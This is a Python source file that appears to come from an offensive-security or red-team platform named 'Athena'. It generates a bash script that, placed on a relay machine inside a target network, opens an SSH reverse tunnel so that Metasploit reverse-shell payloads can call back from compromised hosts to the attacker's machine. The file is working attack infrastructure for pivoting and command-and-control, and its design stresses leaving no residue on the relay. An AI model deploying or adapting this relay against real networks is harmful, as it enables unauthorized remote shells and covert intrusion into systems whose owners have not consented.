# Copyright 2026 Athena Contributors
#
# Use of this software is governed by the Business Source License 1.1
# included in the LICENSE file.
#
# Change Date: Four years from release date of each version
# Change License: Apache License, Version 2.0
#
# For commercial licensing, contact: azz093093.830330@gmail.com

"""SPEC-054: Generate a self-contained SSH reverse tunnel script.

Usage::

    python3 -m app.cli.generate_relay_script > tmp/athena-relay.sh
    chmod +x tmp/athena-relay.sh

or via the Makefile wrapper::

    make relay-script

The generated script is intended to be scp'd to a relay machine on the
target LAN segment and executed there. It establishes a reverse SSH
tunnel that forwards relay:LPORT -> athena-host:LPORT, allowing
Metasploit reverse-shell payloads to call back from the target.

Design contract (SPEC-054, ADR-047 simplified decision):
  - Foreground execution only (no daemonisation)
  - ``set -euo pipefail`` strict error handling
  - ``trap cleanup EXIT SIGINT SIGTERM`` captures all exit paths
  - Child SSH process is explicitly killed on cleanup
  - No PID file, no systemd unit, no crontab, no residue of any kind

Exits with code 1 and writes an error message to stderr if either
``RELAY_IP`` or ``RELAY_ATHENA_HOST`` is unset.
"""

import sys
from datetime import datetime, timezone

from app.config import settings


# The template uses shell ${...} variable expansions which must be
# doubled as `${{` / `}}` inside a Python ``.format`` call. Using a
# plain format here is simpler than Jinja and keeps the CLI module
# dependency-free.
_TEMPLATE = """#!/usr/bin/env bash
#
# Athena Relay Port-Forwarding Script (auto-generated)
# Generated at: {timestamp}
# Relay: {user}@{relay_ip}:{ssh_port}
# Forwards relay:{lport} -> athena:{lport} via SSH reverse tunnel
#
# SPEC-054, ADR-047 simplified decision:
#   - Foreground only, trap cleanup EXIT SIGINT SIGTERM
#   - Ctrl+C kills the SSH child and exits cleanly
#   - No PID file, no systemd unit, no residue
#
# Usage:
#   ./athena-relay.sh
#   (Press Ctrl+C to stop and cleanup)
#
set -euo pipefail

RELAY_IP="{relay_ip}"
SSH_USER="{user}"
SSH_PORT="{ssh_port}"
ATHENA_HOST="{athena_host}"
LPORT={lport}

# --- Cleanup on exit ---
cleanup() {{
    echo ""
    echo "[athena-relay] Cleaning up..."
    if [ -n "${{SSH_PID:-}}" ] && kill -0 "$SSH_PID" 2>/dev/null; then
        kill "$SSH_PID" 2>/dev/null || true
        wait "$SSH_PID" 2>/dev/null || true
    fi
    echo "[athena-relay] Done. No residue."
    exit 0
}}
trap cleanup EXIT SIGINT SIGTERM

# --- Pre-flight checks ---
echo "[athena-relay] Pre-flight checks..."
command -v ssh >/dev/null || {{ echo "ssh not found"; exit 1; }}

if command -v ss >/dev/null 2>&1; then
    if ss -tln 2>/dev/null | grep -q ":${{LPORT}} "; then
        echo "[athena-relay] ERROR: port ${{LPORT}} already bound on this host"
        exit 1
    fi
fi

# --- Start reverse tunnel ---
echo "[athena-relay] Opening SSH reverse tunnel:"
echo "              relay:${{LPORT}} -> ${{ATHENA_HOST}}:${{LPORT}}"
echo "[athena-relay] You are now acting as Athena's reverse shell relay."
echo "[athena-relay] Press Ctrl+C to stop and cleanup."

ssh -N \\
    -p "${{SSH_PORT}}" \\
    -o ExitOnForwardFailure=yes \\
    -o ServerAliveInterval=30 \\
    -o ServerAliveCountMax=3 \\
    -R "0.0.0.0:${{LPORT}}:${{ATHENA_HOST}}:${{LPORT}}" \\
    "${{SSH_USER}}@${{RELAY_IP}}" &
SSH_PID=$!

# Wait forever (cleanup trap fires on exit)
wait "$SSH_PID"
"""


def main() -> int:
    """Entry point — render script to stdout or print error to stderr.

    Returns 0 on success, 1 on configuration error. Never raises.
    """
    relay_ip = getattr(settings, "RELAY_IP", "") or ""
    if not relay_ip:
        print(
            "ERROR: RELAY_IP not set in .env.\n"
            "\n"
            "Set the following before running this generator:\n"
            "  RELAY_IP=<relay machine IP on the target LAN>\n"
            "  RELAY_ATHENA_HOST=<Athena host IP reachable from the relay>\n"
            "  (optional) RELAY_SSH_USER, RELAY_SSH_PORT, RELAY_LPORT\n"
            "\n"
            "See SPEC-054 and ADR-047 for context.",
            file=sys.stderr,
        )
        return 1

    athena_host = getattr(settings, "RELAY_ATHENA_HOST", "") or ""
    if not athena_host:
        print(
            "ERROR: RELAY_ATHENA_HOST not set in .env.\n"
            "\n"
            "This must be the Athena host IP reachable from the relay "
            "machine — for WSL setups this is usually the WSL host "
            "interface IP (e.g. 192.168.96.83), NOT "
            "'host.docker.internal' which is a docker-container-internal "
            "name.\n",
            file=sys.stderr,
        )
        return 1

    script = _TEMPLATE.format(
        timestamp=datetime.now(timezone.utc).isoformat(),
        user=settings.RELAY_SSH_USER,
        relay_ip=relay_ip,
        ssh_port=settings.RELAY_SSH_PORT,
        athena_host=athena_host,
        lport=settings.RELAY_LPORT,
    )
    sys.stdout.write(script)
    return 0


if __name__ == "__main__":
    sys.exit(main())
